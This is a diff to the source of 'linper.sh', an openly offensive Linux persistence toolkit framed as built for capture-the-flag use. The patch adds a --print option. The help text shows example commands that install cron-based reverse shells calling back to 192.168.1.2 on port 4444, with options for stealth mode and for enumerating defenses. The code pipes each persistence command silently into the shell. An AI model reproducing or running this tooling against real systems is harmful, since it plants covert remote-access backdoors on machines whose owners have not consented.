@@ -8,6 +8,7 @@ DISABLEBASHRC=0
 DRYRUN=0
 ENUM_DEF=0
 VALIDSYNTAX=0
+PRINTCOMMANDS=0
 LIMIT=0
 STEALTHMODE=0
 REMOVALTOOL=$(which srm) || REMOVALTOOL=$(which rm)
@@ -22,7 +23,8 @@ INFO="linux persistence toolkit\n\nadvisory: this was developed with ctfs in min
 
 HELP="\e[33m-h, --help\e[0m show this message
 \e[33m--examples\e[0m print example commands
-\e[33m-d, --dryrun\e[0m enumerate binaries only (if ran with -i and -c it will enumerate modifications made by this program) 
+\e[33m-d, --dryrun\e[0m enumerate binaries only (if ran with -i and -c it will enumerate modifications made by this program)
+\e[33m--print\e[0m print commands used to install persitence (assumes -d)
 \e[33m-e, --enum-defenses\e[0m try to enumerate any defenses relevant to installing reverse shells
 \e[33m-i, --rhost\e[0m IP/domain to call back to
 \e[33m-p, --rport\e[0m port to call back to
@@ -34,14 +36,15 @@ HELP="\e[33m-h, --help\e[0m show this message
 
 EXAMPLES="Examples:
 
-Enumerate binaries that can be used for persistence: bash linper.sh -d
-Enumerate defenses: bash linper.sh -e
-Install persistence (default cron & noisy): bash linper.sh -i 192.168.1.2 -p 4444
-Install only 3 reverse shells: bash linper.sh -i 192.168.1.2 -p 4444 -l 3
-Install persistence (custom cron & stealthy): bash linper.sh -i 192.168.1.2 -p 4444 --cron \"* * * 2 3\" -s
-Insall persistence with supplied directory for temporary files: bash linper.sh -i 192.168.1.2 -p 4444 -w /tmp/i/do/not/exist
-Enumerate reverse shells and other modifications to the file system made by this program: bash linper.sh -i 192.168.1.2 -c -d
-Remove persistence for 192.168.1.2: bash linper.sh -i 192.168.1.2 -c"
+\e[33mEnumerate\e[0m binaries that can be used for persistence: bash linper.sh -d
+\e[33mEnumerate\e[0m defenses: bash linper.sh -e
+\e[33mPrint\e[0m Commands that can be used to install persistence (assumes -d): bash linper.sh -i 192.168.1.2 -p 4444 --print 
+\e[33mInstall\e[0m persistence (default cron & noisy): bash linper.sh -i 192.168.1.2 -p 4444
+\e[33mInstall\e[0m only 3 reverse shells: bash linper.sh -i 192.168.1.2 -p 4444 -l 3
+\e[33mInstall\e[0m persistence (custom cron & stealthy): bash linper.sh -i 192.168.1.2 -p 4444 --cron \"* * * 2 3\" -s
+\e[33mInsalll\e[0m persistence with supplied directory for temporary files: bash linper.sh -i 192.168.1.2 -p 4444 -w /tmp/i/do/not/exist
+\e[33mEnumerate\e[0m reverse shells and other modifications to the file system made by this program: bash linper.sh -i 192.168.1.2 -c -d
+\e[33mRemove\e[0m persistence for 192.168.1.2: bash linper.sh -i 192.168.1.2 -c"
 
 while test $# -gt 0;
 do
@@ -93,6 +96,10 @@ do
 	-w|--writable-dir)
 	    shift
 	    WRITABLE_DIR="$1" 
+	    shift ;;
+	--print)
+	    PRINTCOMMANDS=1
+	    DRYRUN=1
 	    shift ;;
     esac
 done
@@ -311,6 +318,11 @@ enum_doors() {
 			    :
 			else
 			    echo -e "\e[92m[+]\e[0m Door Found: $DOOR"
+			    if [ "$PRINTCOMMANDS" -eq 1 ];
+			    then
+				echo "[+] Command Used for Installation: $HINGE"
+				echo
+			    fi
 			    if [ "$DRYRUN" -eq 0 ];
 			    then
 				echo "$HINGE" | $SHELL 2> /dev/null &> /dev/null
@@ -435,6 +447,10 @@ cleanup() {
 	IFS=. read -r a b c d <<< "$ip"
 	RHOST_DECIMAL=$((a * 256 ** 3 + b * 256 ** 2 + c * 256 + d))
 	unset IFS
+	if [ $RHOST_DECIMAL -eq 0 ];
+	then
+	    RHOST_DECIMAL="0.0.0.0"
+	fi
     fi
 
     if [ "$DRYRUN" -ne 1 ];
